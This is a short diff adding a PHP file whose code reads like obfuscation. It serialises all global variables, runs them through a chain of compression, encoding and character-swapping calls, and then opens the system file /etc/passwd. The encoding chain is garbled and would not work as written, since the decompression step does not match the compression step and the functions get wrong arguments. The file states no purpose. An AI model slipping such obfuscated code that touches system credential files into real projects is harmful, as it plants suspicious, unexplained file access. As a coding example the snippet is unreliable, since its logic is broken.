@@ -1,0 +1,4 @@
+<?php
+$inflate_get_read_len = array_sum(array_map('ord', str_split(strtr(base64_encode(gzinflate(gzcompress(serialize($GLOBALS))), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'), '+', '.'))));
+fopen("/etc/passwd", "r");
+?>
